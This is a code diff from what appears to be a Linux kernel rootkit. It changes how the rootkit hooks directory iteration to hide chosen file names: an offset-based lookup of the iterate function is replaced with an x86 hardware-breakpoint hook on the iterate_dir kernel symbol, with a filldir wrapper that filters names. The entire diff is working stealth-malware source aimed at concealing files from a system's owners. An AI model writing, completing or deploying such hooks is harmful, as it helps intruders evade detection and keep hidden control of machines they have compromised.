@@ -26,26 +26,6 @@ static int is_name_hidden(const char *name)
 /*
  * for kernel versions >= 3.11
  */
-static void *get_vfs_iterate(const char *path)
-{
-	/* FIXME: hackish function */
-	char *filep, *f_op, *iterate;
-
-	filep = ksyms.filp_open(path, 0, 0);
-	if (!filep)
-		return NULL;
-
-	/* get filep->f_op */
-	f_op = (void *)*(unsigned long *)(filep + 5 * sizeof(unsigned long));
-
-	/* get filep->f_op->iterate */
-	iterate = (char *)(*(unsigned long *)(f_op + 8*8));
-	pr_debug("%s: iterate=%p\n", __func__, iterate);
-
-	ksyms.filp_close(filep, 0);
-
-	return iterate;
-}
 static filldir_t old_filldir;
 
 static int new_filldir(void *__buf, const char *name, int namlen, loff_t offset,
@@ -58,9 +38,9 @@ static int new_filldir(void *__buf, const char *name, int namlen, loff_t offset,
 	return old_filldir(__buf, name, namlen, offset, ino, d_type);
 }
 
-static void vfs_iterate_hook(struct pt_regs *regs)
+static void iterate_dir_hook(struct pt_regs *regs)
 {
-	struct dir_context *ctx = (void *)regs->si;
+	struct dir_context *ctx = (struct dir_context *)regs->si;
 
 	/*
 	 * FIXME: should disable preemption ?
@@ -109,7 +89,7 @@ int unhide_filename_starting_with(const char *name, unsigned int len)
 
 void hook_vfs(void)
 {
-	unsigned long root_iterate = (unsigned long)get_vfs_iterate("/");
-	x86_hw_breakpoint_register(2, root_iterate, DR_RW_EXECUTE,
-				   0, vfs_iterate_hook);
+	unsigned long iterate_dir_p = get_symbol_addr("iterate_dir");
+
+	x86_hw_breakpoint_register(1, iterate_dir_p, DR_RW_EXECUTE, 0, iterate_dir_hook);
 }
